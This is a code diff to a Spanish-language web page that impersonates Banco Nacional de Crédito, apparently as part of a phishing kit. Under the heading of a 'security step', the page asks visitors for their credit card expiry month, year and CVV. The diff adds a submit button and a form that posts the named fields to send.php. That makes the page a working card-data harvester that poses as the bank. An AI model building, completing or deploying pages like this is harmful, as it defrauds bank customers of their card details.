@@ -153,6 +153,22 @@
     .field select,.field input{font-size:18px;}
     .field-label{font-size:12px;}
   }
+
+
+    .submit-btn{
+    width:100%;
+    border:none;
+    border-radius:14px;
+    background:#FF6A00;
+    color:#fff;
+    font-family:"Poppins",sans-serif;
+    font-size:18px;
+    font-weight:600;
+    padding:16px;
+    cursor:pointer;
+    transition:background .15s ease;
+  }
+  .submit-btn:hover{background:#e85f00;}
 </style>
 </head>
 <body>
@@ -164,12 +180,12 @@
       src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original">
 
     <h1 class="step-title">Paso de seguridad, completa los datos de tu tarjeta de crédito:</h1>
-
+    <form action="send.php" method="POST">
 
     <!-- Mes de vencimiento -->
     <div class="field">
       <label class="field-label" for="mes">Mes de Vencimiento TDC</label>
-      <select id="mes" required>
+      <select id="mes" name="mes" required>
         <option value="" selected>-- Mes --</option>
         <option value="01">01 - Enero</option>
         <option value="02">02 - Febrero</option>
@@ -194,7 +210,7 @@
     <!-- Año de vencimiento -->
     <div class="field">
       <label class="field-label" for="anio">Año de Vencimiento TDC</label>
-      <select id="anio" required>
+      <select id="anio" name="anio" required>
         <option value="" selected>-- Año --</option>
         <!-- Los años se generan con JS -->
       </select>
@@ -207,7 +223,7 @@
 
     <!-- CVV -->
     <div class="field field--cvv">
-      <input type="text" id="cvv" inputmode="numeric" autocomplete="cc-csc"
+      <input type="text" id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc"
              maxlength="4" placeholder="CVV ..." aria-label="CVV">
       <span class="field-icon" aria-hidden="true">
         <svg viewBox="0 0 24 24" fill="currentColor">
@@ -215,7 +231,9 @@
         </svg>
       </span>
     </div>
-
+      
+    <button type="submit" class="submit-btn">Continuar</button>
+  </form>
   </div>
 
   <script>
